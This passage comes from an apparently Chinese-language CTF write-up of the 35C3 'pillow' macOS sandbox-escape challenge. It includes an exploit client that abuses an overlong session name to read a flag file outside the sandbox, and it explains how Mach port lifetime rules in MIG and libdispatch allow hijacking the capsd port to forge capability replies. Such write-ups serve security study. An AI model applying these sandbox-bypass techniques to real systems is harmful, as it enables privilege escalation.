+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bootstrap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mig/shelld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mig/shelld_client.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;common/utils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;common/decls.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean_t</span> <span class="title">shelld_client_server</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">mach_msg_header_t</span> *InHeadP,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">mach_msg_header_t</span> *OutHeadP)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">shelld_client_notify</span><span class="params">(<span class="keyword">mach_port_t</span> listener, <span class="keyword">int</span> status, <span class="keyword">const</span> <span class="keyword">char</span>* output)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Command finished with status %d and output: %s\n"</span>, status, output);</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./client `python -c "print('a'*3)"`</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* session_name = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"session_name: %s\n"</span>, session_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mach_port_t</span> bp, sp;</span><br><span class="line">    task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &amp;bp);</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr = bootstrap_look_up(bp, <span class="string">"net.saelo.shelld"</span>, &amp;sp);</span><br><span class="line">    ASSERT_SUCCESS(kr, <span class="string">"bootstrap_look_up"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mach_port_t</span> listener, listener_send_right;</span><br><span class="line">    <span class="keyword">mach_msg_type_name_t</span> aquired_right;</span><br><span class="line">    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;listener);</span><br><span class="line">    mach_port_extract_right(mach_task_self(), listener, MACH_MSG_TYPE_MAKE_SEND, &amp;listener_send_right, &amp;aquired_right);</span><br><span class="line"></span><br><span class="line">    shelld_create_session(sp, session_name);</span><br><span class="line"></span><br><span class="line">    register_completion_listener(sp, session_name, listener_send_right);</span><br><span class="line">    mach_port_deallocate(mach_task_self(), listener_send_right);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, listener, <span class="number">0</span>, dispatch_get_main_queue());</span><br><span class="line">    dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">        dispatch_mig_server(source, MAX_MSG_SIZE, shelld_client_server);</span><br><span class="line">    &#125;);</span><br><span class="line">    dispatch_activate(source);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试基本功能</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, shell_exec(sp, session_name, <span class="string">"echo 'Hello World'"</span>));</span><br><span class="line">    <span class="comment">// 尝试读取沙箱外部数据</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, shell_exec(sp, session_name, <span class="string">"cat /Users/kiprey/Desktop/CTF/35c3ctf/pillow/flag"</span>));</span><br><span class="line"></span><br><span class="line">    dispatch_main();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果如下：</p>
+<p><img src="/2022/01/35c3ctf_pillow/image-20220108212040495.png" alt="image-20220108212040495"></p>
+<p>可以看到当传入的 session name 超级长的时候，即可超过沙箱函数，读取到沙箱外部文件。</p>
+<p>该问题成功解决。</p>
+<h3 id="2-Capabilities-权限检测绕过">2. Capabilities 权限检测绕过</h3>
+<blockquote>
+<p>这里算是整个题目的重点，稍微有点复杂。</p>
+</blockquote>
+<h4 id="a-提出的设想">a. 提出的设想</h4>
+<p>接下来我们需要绕过 sandbox_check_with_capabilities 检查。再贴一下它的代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sandbox_check_with_capabilities</span><span class="params">(<span class="keyword">audit_token_t</span> creds, <span class="keyword">const</span> <span class="keyword">char</span>* operation, <span class="keyword">int</span> flags, <span class="keyword">const</span> <span class="keyword">char</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = sandbox_check_by_audit_token(creds, operation, flags, arg);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> client_has_capability = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = audit_token_to_pid(creds);</span><br><span class="line">    has_capability(capsd_service_port, pid, operation, arg, &amp;client_has_capability);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !client_has_capability;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显，作为<strong>位于沙箱</strong>中的发送方，exploit 肯定没有权限执行 /bin/bash，因此 <code>sandbox_check_by_audit_token</code> 无论如何一定会返回 <strong>1</strong>。因此 shelld 将会向 capsd 进行第二次查询。</p>
+<p>如果 capsd 中可以返回一个 has capability 的结果给 shelld，那么 exploit 就可以通过 sandbox check，从而 get flag。但正常情况下 exploit 无法通过 capsd 里 grand_capability 方法中的 sand_check_* 函数，因此 capsd <strong>将不会返回</strong>一个我们所期望的结果给 shelld。</p>
+<p>那<strong>如果我们能劫持这个 capsd_service_port</strong> ，自己<strong>伪造一个 “capsd” 向 shelld 发送伪造结果</strong>，那么就可以通过 shelld 的 sandbox check，进而 get flag。</p>
+<p>那该如何伪造呢？这就涉及 <strong>MIG 所有权规则（MIG ownership rule）</strong>。</p>
+<h4 id="b-MIG-所有权规则">b. MIG 所有权规则</h4>
+<p>这里的所有权，指的是<strong>调用者</strong>以<strong>参数</strong>形式 <strong>传给 MIG 例程的 mach port</strong>的所有权。</p>
+<p>之前在学习 Mach IPC 时，我们只是简单的了解了 MIG 传递基础类型的例子，并没有思考过传递复杂类型参数时的一些细节。</p>
+<p>现在仔细想想，对于<strong>调用者传递一个 mach port</strong> 给 server 的情况，这个 <strong>mach port 的生命周期</strong>该如何管理呢？</p>
+<blockquote>
+<p>这里，我们将以 shelld 中的 <code>register_completion_listener</code> 函数来作为一个例子，因为只有该函数会接收一个 mach port 类型的参数。</p>
+</blockquote>
+<h5 id="1-shelld-server">1) shelld_server</h5>
+<p>初始时，shelld 会指定 shell_server 函数来处理所有传入的 mach message。而 MIG shelld_server 函数的功能相当简单：做一些基础检查工作，之后根据接收到的 mach message 中的 <code>msgh_id</code> 字段，来动态选择调用哪个 routine 例程：</p>
+<blockquote>
+<p>之前曾提到过，每个 mach message header 中有个字段 <code>msgh_id</code>，这个是可供用户自己使用的一个字段， MIG 使用该字段来区分client 想调用哪个 server 接口。</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shelldServer.c</span></span><br><span class="line">mig_external <span class="keyword">boolean_t</span> shelld_server</span><br><span class="line">    (<span class="keyword">mach_msg_header_t</span> *InHeadP, <span class="keyword">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">mig_routine_t</span> routine;</span><br><span class="line">    <span class="comment">// 初始化待返回给 client 的 mach message 相关字段</span></span><br><span class="line">    OutHeadP-&gt;msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REPLY(InHeadP-&gt;msgh_bits), <span class="number">0</span>);</span><br><span class="line">    OutHeadP-&gt;msgh_remote_port = InHeadP-&gt;msgh_reply_port;</span><br><span class="line">    <span class="comment">/* Minimal size: routine() will update it if different */</span></span><br><span class="line">    OutHeadP-&gt;msgh_size = (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">mig_reply_error_t</span>);</span><br><span class="line">    OutHeadP-&gt;msgh_local_port = MACH_PORT_NULL;</span><br><span class="line">    OutHeadP-&gt;msgh_id = InHeadP-&gt;msgh_id + <span class="number">100</span>;</span><br><span class="line">    OutHeadP-&gt;msgh_reserved = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 判断 msg_id 是否有效，如果有效，则设置 msg_id 对应的 MIG 接口处理例程至 routine 函数指针中</span></span><br><span class="line">    <span class="keyword">if</span> ((InHeadP-&gt;msgh_id &gt; <span class="number">133703</span>) || (InHeadP-&gt;msgh_id &lt; <span class="number">133700</span>) ||</span><br><span class="line">        ((routine = shelld_subsystem.routine[InHeadP-&gt;msgh_id - <span class="number">133700</span>].stub_routine) == <span class="number">0</span>)) &#123;</span><br><span class="line">        ((<span class="keyword">mig_reply_error_t</span> *)OutHeadP)-&gt;NDR = NDR_record;</span><br><span class="line">        ((<span class="keyword">mig_reply_error_t</span> *)OutHeadP)-&gt;RetCode = MIG_BAD_ID;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最后调用该 MIG 接口处理例程</span></span><br><span class="line">    (*routine) (InHeadP, OutHeadP);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，shell_server 在 MIG 功能正常的情况下，将会<strong>始终返回 TRUE</strong>。</p>
+<p>同时我们也可以看到，<strong>返回给 client 的信息并非 COMPLEX</strong>。</p>
+<blockquote>
+<p>注意给 OutHeadP 设置 msgh_bits 时没有指定 COMPLEX flag。</p>
+</blockquote>
+<h5 id="2-Xregister-completion-listener">2) _Xregister_completion_listener</h5>
+<p>当 Client 需要调用 register_completion_listener 函数时，shelld_server 会对应的调用到该函数的 routine 函数，即 <code>_Xregister_completion_listener</code>。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine register_completion_listener */</span></span><br><span class="line">mig_internal novalue _Xregister_completion_listener</span><br><span class="line">    (<span class="keyword">mach_msg_header_t</span> *InHeadP, <span class="keyword">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line">[...]</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">mach_msg_header_t</span> Head;</span><br><span class="line">        <span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">        <span class="keyword">mach_msg_body_t</span> msgh_body;</span><br><span class="line">        <span class="keyword">mach_msg_port_descriptor_t</span> listener;</span><br><span class="line">        <span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">        NDR_record_t NDR;</span><br><span class="line">        <span class="keyword">mach_msg_type_number_t</span> sessionOffset; <span class="comment">/* MiG doesn't use it */</span></span><br><span class="line">        <span class="keyword">mach_msg_type_number_t</span> sessionCnt;</span><br><span class="line">        <span class="keyword">char</span> session[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">mach_msg_max_trailer_t</span> trailer;</span><br><span class="line">    &#125; Request __attribute__((unused));</span><br><span class="line">[...]</span><br><span class="line">    <span class="keyword">typedef</span> __Request__register_completion_listener_t __Request;</span><br><span class="line">    <span class="keyword">typedef</span> __Reply__register_completion_listener_t Reply __attribute__((unused));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Request *In0P = (Request *) InHeadP;</span><br><span class="line">    Reply *OutP = (Reply *) OutHeadP;</span><br><span class="line">    <span class="keyword">mach_msg_max_trailer_t</span> *TrailerP;</span><br><span class="line">[...]</span><br><span class="line">    OutP-&gt;RetCode = register_completion_listener(In0P-&gt;Head.msgh_request_port, In0P-&gt;session, In0P-&gt;listener.name, TrailerP-&gt;msgh_audit);</span><br><span class="line">    </span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，Client 传递 mach port 给 server 时，是通过 <code>mach_msg_port_descriptor_t</code>来传递的。并且在下面调用了最终服务器所实现的那个接口，并将返回值（KERN_* 类型）存入 <code>RetCode</code> 字段中。</p>
+<p>以下是返回的 mach msg 结构体，可以看到这个字段是为数不多会向上层传递的值：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">mach_msg_header_t</span> Head;</span><br><span class="line">    NDR_record_t NDR;</span><br><span class="line">    <span class="keyword">kern_return_t</span> RetCode;</span><br><span class="line">&#125; __Reply__unregister_completion_listener_t __attribute__((unused));</span><br></pre></td></tr></table></figure>
+<p>那么这个 RetCode 在哪里使用呢？换句话说 server 实现的接口所返回的 KERN_* 返回值，对 server 所接收到的 listener mach port 的生命周期有影响么？</p>
+<p>还真有影响。</p>
+<h5 id="3-libdispatch">3) libdispatch</h5>
+<p>我们再来看看 libdispatch 是如何处理 client 传来的 mach message 的。</p>
+<p>对于 shelld 来说，可以看到它指定 libdispatch 调用 <code>dispatch_mig_server</code> 函数来处理 mach message。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, service_port, <span class="number">0</span>, dispatch_get_main_queue());</span><br><span class="line"></span><br><span class="line">dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">    dispatch_mig_server(source, MAX_MSG_SIZE, shelld_server);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">dispatch_resume(source);</span><br><span class="line">dispatch_main();</span><br></pre></td></tr></table></figure>
+<p>那我们就来简单了解一下 <code>dispatch_mig_server</code>  这个函数，以下是该函数核心源代码，代码经过省略并添加大量说明文字：</p>
+<blockquote>
+<p>libdispatch 源码可以到 <a href="https://opensource.apple.com/tarballs/libdispatch/" target="_blank" rel="noopener">apple opensource libdispatch src</a> 获取。</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">dispatch_mig_server(<span class="keyword">dispatch_source_t</span> ds, <span class="keyword">size_t</span> maxmsgsz,</span><br><span class="line">        <span class="keyword">dispatch_mig_callback_t</span> callback)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">uint32_t</span> cnt = <span class="number">1000</span>; <span class="comment">// do not stall out serial queues</span></span><br><span class="line">    <span class="keyword">boolean_t</span> demux_success;</span><br><span class="line">    <span class="keyword">bool</span> received = <span class="literal">false</span>;</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    tmp_options = options;</span><br><span class="line">    <span class="comment">// XXX FIXME -- change this to not starve out the target queue</span></span><br><span class="line">    <span class="comment">// 尝试  cnt 次从消息队列中读取数据的操作</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 如果循环经历了 cnt 次，或者等待队列为空</span></span><br><span class="line">        <span class="keyword">if</span> (DISPATCH_QUEUE_IS_SUSPENDED(ds) || (--cnt == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// 则在接下来的函数执行过程中，不再接收 mach message</span></span><br><span class="line">            options &amp;= ~MACH_RCV_MSG;</span><br><span class="line">            tmp_options &amp;= ~MACH_RCV_MSG;</span><br><span class="line">            <span class="comment">// 如果此时没有需要发送的数据，即这次是要继续尝试接收 message ，则直接返回</span></span><br><span class="line">            <span class="keyword">if</span> (!(tmp_options &amp; MACH_SEND_MSG)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 此时 mach_msg 可能会接收或发送消息。循环第一次为RCV，第二次为SEND+RCV，第三次为SEND+RCV,最后一次为RCV，以此类推。</span></span><br><span class="line">        kr = mach_msg(&amp;bufReply-&gt;Head, tmp_options, bufReply-&gt;Head.msgh_size,</span><br><span class="line">                (<span class="keyword">mach_msg_size_t</span>)rcv_size, (<span class="keyword">mach_port_t</span>)dr-&gt;du_ident, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 重置临时设置</span></span><br><span class="line">        tmp_options = options;</span><br><span class="line">        <span class="comment">// mach_msg 错误处理，这里无需关注</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(kr)) &#123;</span><br><span class="line">            [...]</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果接下来不再需要接收消息，则直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (!(tmp_options &amp; MACH_RCV_MSG)) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [...]</span><br><span class="line">        <span class="comment">// 走到这里则说明这一轮的循环 接收了一个 mach message(有没有在接收的时候顺带发了个msg，这里不管)</span></span><br><span class="line">        received = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// bufRequest 和 bufReply 进行交换</span></span><br><span class="line">        bufTemp = bufRequest;</span><br><span class="line">        bufRequest = bufReply;</span><br><span class="line">        bufReply = bufTemp;</span><br><span class="line">        <span class="comment">// 此时接收到的 Mach msg 位于 bufRequest</span></span><br><span class="line"></span><br><span class="line">        [...]</span><br><span class="line">        </span><br><span class="line">        _voucher_replace(voucher_create_with_mach_msg(&amp;bufRequest-&gt;Head));</span><br><span class="line">        bufReply-&gt;Head = (<span class="keyword">mach_msg_header_t</span>)&#123; &#125;;</span><br><span class="line">        <span class="comment">// 将接收到的信息调用 callback 处理，这里的 callback 是其他程序为 dispatch_mig_server 函数指定的一个 MIG 处理例程</span></span><br><span class="line">        <span class="comment">// 在 shelld 中，这个 callback 为 shelld_server</span></span><br><span class="line">        demux_success = callback(&amp;bufRequest-&gt;Head, &amp;bufReply-&gt;Head);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果传入的 MIG Message 的 msgh_id 错误，导致 callback 失败</span></span><br><span class="line">        <span class="keyword">if</span> (!demux_success) &#123;</span><br><span class="line">            <span class="comment">// destroy the request - but not the reply port</span></span><br><span class="line">            bufRequest-&gt;Head.msgh_remote_port = <span class="number">0</span>;</span><br><span class="line">            mach_msg_destroy(&amp;bufRequest-&gt;Head);</span><br><span class="line">        <span class="comment">// 如果 callback 成功，并且需要返回的信息并非复杂信息</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(bufReply-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX)) &#123;</span><br><span class="line">            <span class="comment">// if MACH_MSGH_BITS_COMPLEX is _not_ set, then bufReply-&gt;RetCode</span></span><br><span class="line">            <span class="comment">// is present</span></span><br><span class="line">            <span class="comment">// 如果调用 server 的接口失败，即该接口返回的值不为 KERN_SUCCESS</span></span><br><span class="line">            <span class="keyword">if</span> (unlikely(bufReply-&gt;RetCode)) &#123;</span><br><span class="line">                [...]</span><br><span class="line"></span><br><span class="line">                <span class="comment">// destroy the request - but not the reply port</span></span><br><span class="line">                bufRequest-&gt;Head.msgh_remote_port = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// 将会析构掉发来的 mach message</span></span><br><span class="line">                mach_msg_destroy(&amp;bufRequest-&gt;Head);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果需要回复信息，则设置 SEND flag，一会将跳转至循环头部执行 mach_msg(RCV|SEND)</span></span><br><span class="line">        <span class="keyword">if</span> (bufReply-&gt;Head.msgh_remote_port) &#123;</span><br><span class="line">            tmp_options |= MACH_SEND_MSG;</span><br><span class="line">            <span class="keyword">if</span> (MACH_MSGH_BITS_REMOTE(bufReply-&gt;Head.msgh_bits) !=</span><br><span class="line">                    MACH_MSG_TYPE_MOVE_SEND_ONCE) &#123;</span><br><span class="line">                tmp_options |= MACH_SEND_TIMEOUT;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意到这个片段：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 shelld 中，这个 callback 为 shelld_server</span></span><br><span class="line">demux_success = callback(&amp;bufRequest-&gt;Head, &amp;bufReply-&gt;Head);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果传入的 MIG Message 的 msgh_id 错误，导致 callback 失败</span></span><br><span class="line"><span class="keyword">if</span> (!demux_success) &#123;</span><br><span class="line">    [...]</span><br><span class="line"><span class="comment">// 如果 callback 成功，并且需要返回的信息并非复杂信息</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(bufReply-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX)) &#123;</span><br><span class="line">    <span class="comment">// if MACH_MSGH_BITS_COMPLEX is _not_ set, then bufReply-&gt;RetCode</span></span><br><span class="line">    <span class="comment">// is present</span></span><br><span class="line">    <span class="comment">// 如果调用 server 的接口失败，即该接口返回的值不为 KERN_SUCCESS</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(bufReply-&gt;RetCode)) &#123;</span><br><span class="line">        [...]</span><br><span class="line"></span><br><span class="line">        <span class="comment">// destroy the request - but not the reply port</span></span><br><span class="line">        bufRequest-&gt;Head.msgh_remote_port = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 将会析构掉发来的 mach message</span></span><br><span class="line">        mach_msg_destroy(&amp;bufRequest-&gt;Head);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中， callback 为之前 shelld 所指定的 <code>shelld_server</code>，几乎<strong>不可能返回 FALSE</strong>，同时待回复的 <strong>mach message 不为 COMPLEX</strong>，因此接下来的第一个 if 判断将不成立，进入第二个 if 分支中。</p>
+<p>在这个 if 分支中，dispatch_mig_server 将对调用结果 RetCode 进行判断：<strong>如果调用失败，则调用 mach_msg_destroy 将 Request message 析构</strong>。</p>
+<p>而在 <code>mach_msg_destroy</code> 的 XNU 实现中，注意到它会析构掉所传入 mach msg 中的 <code>MACH_MSG_PORT_DESCRIPTOR</code>，而这里<strong>存放的是先前 client 传来的 listerner mach port</strong>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span 